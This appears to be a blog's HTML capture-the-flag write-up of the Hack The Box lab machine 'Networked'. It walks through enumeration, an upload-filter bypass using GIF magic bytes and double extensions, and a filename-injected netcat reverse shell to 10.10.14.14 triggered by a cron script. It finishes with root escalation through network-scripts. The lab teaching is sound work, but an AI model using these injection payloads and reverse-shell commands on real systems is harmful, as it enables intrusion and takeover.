@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup theme-color -->
+<!-- start theme color meta headers -->
+<meta name="theme-color" content="#151515">
+<meta name="msapplication-navbutton-color" content="#151515">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- end theme color meta headers -->
+
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>CentHack | Welcome to my blog!!</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="CentHack" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Welcome to my blog!!" />
+<meta property="og:description" content="Welcome to my blog!!" />
+<link rel="canonical" href="http://localhost:4000/pages/writeups/networked.html" />
+<meta property="og:url" content="http://localhost:4000/pages/writeups/networked.html" />
+<meta property="og:site_name" content="CentHack" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="CentHack" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Welcome to my blog!!","headline":"CentHack","url":"http://localhost:4000/pages/writeups/networked.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/">
+          <h1>CentHack</h1>
+        </a>
+        <h2>Welcome to my blog!!</h2>
+
+        <section id="downloads">
+          
+          <a href="" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <h1 id="networked">Networked</h1>
+
+<h1 id="enumeration">Enumeration</h1>
+
+<p>IP → 10.10.10.146</p>
+
+<p>Open ports.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT    STATE  SERVICE REASON
+22/tcp  open   ssh     syn-ack
+80/tcp  open   http    syn-ack
+</code></pre></div></div>
+
+<h3 id="web-server-enumeration">Web server enumeration</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/linux/networked]
+└─<span class="nv">$ </span>curl <span class="nt">-I</span> 10.10.10.146 
+HTTP/1.1 200 OK
+Date: Fri, 22 Dec 2023 05:28:12 GMT
+Server: Apache/2.4.6 <span class="o">(</span>CentOS<span class="o">)</span> PHP/5.4.16
+X-Powered-By: PHP/5.4.16
+Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
+
+                                                                                                                                                                                                                                            
+┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/linux/networked]
+└─<span class="nv">$ </span>whatweb 10.10.10.146                   
+http://10.10.10.146 <span class="o">[</span>200 OK] Apache[2.4.6], Country[RESERVED][ZZ], HTTPServer[CentOS][Apache/2.4.6 <span class="o">(</span>CentOS<span class="o">)</span> PHP/5.4.16], IP[10.10.10.146], PHP[5.4.16], X-Powered-By[PHP/5.4.16]
+</code></pre></div></div>
+
+<ul>
+  <li>PHP version is very old</li>
+</ul>
+
+<p>The source code of the web server suggets that thera are more routes. And it is and <code class="language-plaintext highlighter-rouge">index.php</code> page.</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+Hello mate, we're building the new FaceMash!<span class="nt">&lt;/br&gt;</span>
+Help by funding us and be the new Tyler<span class="err">&amp;</span>Cameron!<span class="nt">&lt;/br&gt;</span>
+Join us at the pool party this Sat to get a glimpse
+<span class="c">&lt;!-- upload and gallery not yet linked --&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+
+<h3 id="fuzzing-http101010146">Fuzzing http://10.10.10.146/</h3>
+
+<ul>
+  <li>
+    <p>common.txt</p>
+
+    <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  /.hta                 (Status: 403) [Size: 206]
+  /.htaccess            (Status: 403) [Size: 211]
+  /.htpasswd            (Status: 403) [Size: 211]
+  /backup               (Status: 301) [Size: 235] [--&gt; http://10.10.10.146/backup/]
+  /cgi-bin/             (Status: 403) [Size: 210]
+  /index.php            (Status: 200) [Size: 229]
+  /uploads              (Status: 301) [Size: 236] [--&gt; http://10.10.10.146/uploads/]
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>directory-list-2.3-medium.txt</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  /index.php            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 229]
+  /uploads              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 236] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.10.146/uploads/]
+  /photos.php           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 1302]
+  /upload.php           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 169]
+  /lib.php              <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 0]
+  /backup               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 235] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.10.146/backup/]
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<h1 id="inspecting-the-web-backup">Inspecting the web backup</h1>
+
+<p>We found a web backup, but we don’t know it is up to date. The files in this backup are the same ones we have found using fuzzing.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/linux/networked]
+└─<span class="nv">$ </span><span class="nb">tar</span> <span class="nt">-tf</span> backup.tar
+index.php
+lib.php
+photos.php
+upload.php
+</code></pre></div></div>
+
+<p>The first we want to do is to bypass this:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nf">check_file_type</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"myFile"</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">filesize</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'myFile'</span><span class="p">][</span><span class="s1">'tmp_name'</span><span class="p">])</span> <span class="o">&lt;</span> <span class="mi">60000</span><span class="p">))</span> <span class="p">{</span>
+      <span class="k">echo</span> <span class="s1">'&lt;pre&gt;Invalid image file.&lt;/pre&gt;'</span><span class="p">;</span>
+      <span class="nf">displayform</span><span class="p">();</span>
+    <span class="p">}</span>
+</code></pre></div></div>
+
+<ul>
+  <li>We need to bypass the file type filter</li>
+  <li>We need a little image</li>
+</ul>
+
+<p>To bypass this first filter we can upload a PHP but appending the magic bytes of a GIF image atthe beginning of the script.</p>
+
+<p><img src="Networked%2069bfd8bf7ef543cb8826afecf0d949aa/Untitled.png" alt="Untitled" /></p>
+
+<p>The function check_file_type will check the mimetype of the file we upload. Bascially this is the first bytes of the file. If we write <code class="language-plaintext highlighter-rouge">GIF8;</code> we will bypass this check.</p>
+
+<p>Now we have to bypass the web server extension filter.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">list</span> <span class="p">(</span><span class="nv">$foo</span><span class="p">,</span><span class="nv">$ext</span><span class="p">)</span> <span class="o">=</span> <span class="nf">getnameUpload</span><span class="p">(</span><span class="nv">$myFile</span><span class="p">[</span><span class="s2">"name"</span><span class="p">]);</span>
+    <span class="nv">$validext</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">'.jpg'</span><span class="p">,</span> <span class="s1">'.png'</span><span class="p">,</span> <span class="s1">'.gif'</span><span class="p">,</span> <span class="s1">'.jpeg'</span><span class="p">);</span>
+    <span class="nv">$valid</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$validext</span> <span class="k">as</span> <span class="nv">$vext</span><span class="p">)</span> <span class="p">{</span>
+      <span class="k">if</span> <span class="p">(</span><span class="nb">substr_compare</span><span class="p">(</span><span class="nv">$myFile</span><span class="p">[</span><span class="s2">"name"</span><span class="p">],</span> <span class="nv">$vext</span><span class="p">,</span> <span class="o">-</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$vext</span><span class="p">))</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$valid</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+</code></pre></div></div>
+
+<p>It will check if the extension of the uploaded file is the one of an image. To bypass this we can tamper the name of our file in the following manner.</p>
+
+<p><img src="Networked%2069bfd8bf7ef543cb8826afecf0d949aa/Untitled%201.png" alt="Untitled" /></p>
+
+<p>Now if we access this image directly in the uploads folder, we will see the phpinfo from the machine.</p>
+
+<p><img src="Networked%2069bfd8bf7ef543cb8826afecf0d949aa/Untitled%202.png" alt="Untitled" /></p>
+
+<p>Gaining a foothold now is trivial, we will upload a php reverse shell.</p>
+
+<h1 id="pivoting-from-apache-user-to-guly">Pivoting from apache user to guly</h1>
+
+<ul>
+  <li>Files belonging to him</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-4.2<span class="nv">$ </span>find / <span class="nt">-user</span> <span class="s2">"guly"</span> 2&gt;/dev/null <span class="nt">-ls</span>
+12583041    4 drwxr-xr-x   2 guly     guly         4096 Sep  6  2022 /home/guly
+13393855    4 <span class="nt">-rw-r--r--</span>   1 guly     guly           18 Oct 30  2018 /home/guly/.bash_logout
+13393856    4 <span class="nt">-rw-r--r--</span>   1 guly     guly          193 Oct 30  2018 /home/guly/.bash_profile
+13393857    4 <span class="nt">-rw-r--r--</span>   1 guly     guly          231 Oct 30  2018 /home/guly/.bashrc
+13393866    4 <span class="nt">-r--------</span>   1 guly     guly           33 Dec 22 09:10 /home/guly/user.txt
+  5740    4 <span class="nt">-rw-rw----</span>   1 guly     mail         2941 Jul  2  2019 /var/spool/mail/guly
+</code></pre></div></div>
+
+<ul>
+  <li>Crontab</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-4.2<span class="nv">$ </span><span class="nb">cat </span>crontab.guly 
+<span class="k">*</span>/3 <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> php /home/guly/check_attack.php
+bash-4.2<span class="nv">$ </span><span class="nb">cat </span>check_attack.php 
+&lt;?php
+require <span class="s1">'/var/www/html/lib.php'</span><span class="p">;</span>
+<span class="nv">$path</span> <span class="o">=</span> <span class="s1">'/var/www/html/uploads/'</span><span class="p">;</span>
+<span class="nv">$logpath</span> <span class="o">=</span> <span class="s1">'/tmp/attack.log'</span><span class="p">;</span>
+<span class="nv">$to</span> <span class="o">=</span> <span class="s1">'guly'</span><span class="p">;</span>
+<span class="nv">$msg</span><span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
+<span class="nv">$headers</span> <span class="o">=</span> <span class="s2">"X-Mailer: check_attack.php</span><span class="se">\r\n</span><span class="s2">"</span><span class="p">;</span>
+
+<span class="nv">$files</span> <span class="o">=</span> array<span class="o">()</span><span class="p">;</span>
+<span class="nv">$files</span> <span class="o">=</span> preg_grep<span class="o">(</span><span class="s1">'/^([^.])/'</span>, scandir<span class="o">(</span><span class="nv">$path</span><span class="o">))</span><span class="p">;</span>
+
+foreach <span class="o">(</span><span class="nv">$files</span> as <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="o">)</span> <span class="o">{</span>
+        <span class="nv">$msg</span><span class="o">=</span><span class="s1">''</span><span class="p">;</span>
+  <span class="k">if</span> <span class="o">(</span><span class="nv">$value</span> <span class="o">==</span> <span class="s1">'index.html'</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">continue</span><span class="p">;</span>
+  <span class="o">}</span>
+  <span class="c">#echo "-------------\n";</span>
+
+  <span class="c">#print "check: $value\n";</span>
+  list <span class="o">(</span><span class="nv">$name</span>,<span class="nv">$ext</span><span class="o">)</span> <span class="o">=</span> getnameCheck<span class="o">(</span><span class="nv">$value</span><span class="o">)</span><span class="p">;</span>
+  <span class="nv">$check</span> <span class="o">=</span> check_ip<span class="o">(</span><span class="nv">$name</span>,<span class="nv">$value</span><span class="o">)</span><span class="p">;</span>
+
+  <span class="k">if</span> <span class="o">(!(</span><span class="nv">$check</span><span class="o">[</span>0]<span class="o">))</span> <span class="o">{</span>
+    <span class="nb">echo</span> <span class="s2">"attack!</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+    <span class="c"># todo: attach file</span>
+    file_put_contents<span class="o">(</span><span class="nv">$logpath</span>, <span class="nv">$msg</span>, FILE_APPEND | LOCK_EX<span class="o">)</span><span class="p">;</span>
+
+    <span class="nb">exec</span><span class="o">(</span><span class="s2">"rm -f </span><span class="nv">$logpath</span><span class="s2">"</span><span class="o">)</span><span class="p">;</span>
+    <span class="nb">exec</span><span class="o">(</span><span class="s2">"nohup /bin/rm -f </span><span class="nv">$path$value</span><span class="s2"> &gt; /dev/null 2&gt;&amp;1 &amp;"</span><span class="o">)</span><span class="p">;</span>
+    <span class="nb">echo</span> <span class="s2">"rm -f </span><span class="nv">$path$value</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+    mail<span class="o">(</span><span class="nv">$to</span>, <span class="nv">$msg</span>, <span class="nv">$msg</span>, <span class="nv">$headers</span>, <span class="s2">"-F</span><span class="nv">$value</span><span class="s2">"</span><span class="o">)</span><span class="p">;</span>
+  <span class="o">}</span>
+<span class="o">}</span>
+
+?&gt;
+</code></pre></div></div>
+
+<p>We can try to inject a command execution in one of th exec statements. We can control the value of the variable <code class="language-plaintext highlighter-rouge">$value</code> , this variable is created in a for loop and is the name of the files in the <code class="language-plaintext highlighter-rouge">/var/www/html/uploads</code> directory. In each iteration it is set to one the files.</p>
+
+<p>So to inejct a command here we can try the following.</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">echo '' &gt; '/var/www/html/uploads/";$(nc -c bash 10.10.14.14 443);"’</code></li>
+</ul>
+
+<p>If we wait some minutes we will receive a shell as user guly.</p>
+
+<h1 id="privilege-escalation">Privilege escalation</h1>
+
+<p>As user guly we have a sudo privilege.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>guly@networked ~]<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+Matching Defaults entries <span class="k">for </span>guly on networked:
+    <span class="o">!</span>visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
+    env_reset, <span class="nv">env_keep</span><span class="o">=</span><span class="s2">"COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS"</span>,
+    env_keep+<span class="o">=</span><span class="s2">"MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE"</span>,
+    env_keep+<span class="o">=</span><span class="s2">"LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES"</span>,
+    env_keep+<span class="o">=</span><span class="s2">"LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE"</span>,
+    env_keep+<span class="o">=</span><span class="s2">"LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY"</span>,
+    <span class="nv">secure_path</span><span class="o">=</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin
+
+User guly may run the following commands on networked:
+    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/local/sbin/changename.sh
+</code></pre></div></div>
+
+<p>The script is this one.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash -p</span>
+<span class="nb">cat</span> <span class="o">&gt;</span> /etc/sysconfig/network-scripts/ifcfg-guly <span class="o">&lt;&lt;</span> <span class="no">EoF</span><span class="sh">
+DEVICE=guly0
+ONBOOT=no
+NM_CONTROLLED=no
+</span><span class="no">EoF
+
+</span><span class="nv">regexp</span><span class="o">=</span><span class="s2">"^[a-zA-Z0-9_</span><span class="se">\ </span><span class="s2">/-]+$"</span>
+
+<span class="k">for </span>var <span class="k">in </span>NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO<span class="p">;</span> <span class="k">do
+        </span><span class="nb">echo</span> <span class="s2">"interface </span><span class="nv">$var</span><span class="s2">:"</span>
+        <span class="nb">read </span>x
+        <span class="k">while</span> <span class="o">[[</span> <span class="o">!</span> <span class="nv">$x</span> <span class="o">=</span>~ <span class="nv">$regexp</span> <span class="o">]]</span><span class="p">;</span> <span class="k">do
+                </span><span class="nb">echo</span> <span class="s2">"wrong input, try again"</span>
+                <span class="nb">echo</span> <span class="s2">"interface </span><span class="nv">$var</span><span class="s2">:"</span>
+                <span class="nb">read </span>x
+        <span class="k">done
+        </span><span class="nb">echo</span> <span class="nv">$var</span><span class="o">=</span><span class="nv">$x</span> <span class="o">&gt;&gt;</span> /etc/sysconfig/network-scripts/ifcfg-guly
+<span class="k">done</span>
+  
+/sbin/ifup guly0
+</code></pre></div></div>
+
+<p>We can try to inject commands, but nothing of that will work because of the regex filter. If we search about <strong>network-scripts w</strong>e will find the following post <a href="https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&amp;qid=e026a0c5f83df4fd532442e1324ffa4f">https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&amp;qid=e026a0c5f83df4fd532442e1324ffa4f</a> which tells how you can execute commands as root using this directory.</p>
+
+<p>Basically the following input will allowus to execute commands as root.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>guly@networked ~]<span class="nv">$ </span><span class="nb">sudo</span> /usr/local/sbin/changename.sh
+interface NAME:
+Network /bin/id
+interface PROXY_METHOD:
+<span class="nb">test
+</span>interface BROWSER_ONLY:
+<span class="nb">test</span>^H^H^H
+wrong input, try again
+interface BROWSER_ONLY:
+tes
+interface BOOTPROTO:
+<span class="nb">test
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</code></pre></div></div>
+
+<p>We execute <code class="language-plaintext highlighter-rouge">bash</code> insteod of the <code class="language-plaintext highlighter-rouge">id</code> command and we are root.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>interface NAME:
+net bash
+interface PROXY_METHOD:
+
+wrong input, try again
+interface PROXY_METHOD:
+s
+interface BROWSER_ONLY:
+s
+interface BOOTPROTO:
+s
+<span class="o">[</span>root@networked network-scripts]# <span class="nb">whoami
+</span>root
+</code></pre></div></div>
+
+      </section>
+    </div>
+  </body>
+</html>
